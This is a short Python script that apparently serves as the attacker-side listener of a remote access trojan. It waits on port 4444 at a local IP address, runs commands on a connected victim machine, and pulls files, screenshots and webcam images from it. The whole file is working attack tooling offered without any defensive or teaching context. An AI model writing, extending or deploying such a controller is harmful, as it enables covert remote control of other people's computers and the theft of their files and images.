import socket, json
import termcolor
import base64


class Listener:
	cam_count = 0 
	src_count = 0

	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip, port))
		listener.listen(0)
		print("[+] Waiting for incoming connections")
		self.connection, address = listener.accept()
		print("[+] Got a connection from " + str(address))

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(bytes(json_data, "utf-8"))

	def reliable_recive(self):
		json_data = ""
		# print(self.connection.recv(1024))
		while True:
			try:
				json_data += self.connection.recv(1024).decode("utf-8")
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_remotely(self, command):
		self.reliable_send(command)
		if command.split()[0] == "exit":
			self.connection.close()
			exit()
		return self.reliable_recive()

	def write_file(self, path, content):
		content = base64.b64decode(content)
		with open(path, "wb") as file:
			file.write(content)
			print(f"[+] You can see your file as {path}")

	def read_file(self, path):
		file = open(path, "rb").read()
		file = base64.encodebytes(file).decode('utf-8')
		return file

	def run(self):
		while True:
			command = input(termcolor.colored("user $ ", "cyan"))
			# command = input("user $ ")

			try:
				if command.split()[0] == 'upload':
					file_name = command.replace("upload ", "")
					file_content = self.read_file(file_name)
					command += " " + file_content

				result = self.execute_remotely(command)

				if command.split()[0] == "download":
					file_name = command.replace("download ", "")
					if result != False:
						self.write_file(file_name, result)
					else:
						print("[-] Check your command")
				elif command.split()[0] == "screenshot":
					self.write_file(f"screen_{self.src_count}.png", result)
					self.src_count += 1
				elif command.split()[0] == "camera":
					self.write_file(f"camera_{self.cam_count}.jpg", result)
					self.cam_count += 1
				else:
					if result != None:
						print(result)
					else:
						print("[~] Check your command")
			except Exception as error:
				print(error)
				# print("[-] Something was wrong!")


my_listener = Listener("192.168.0.104", 4444)
my_listener.run()
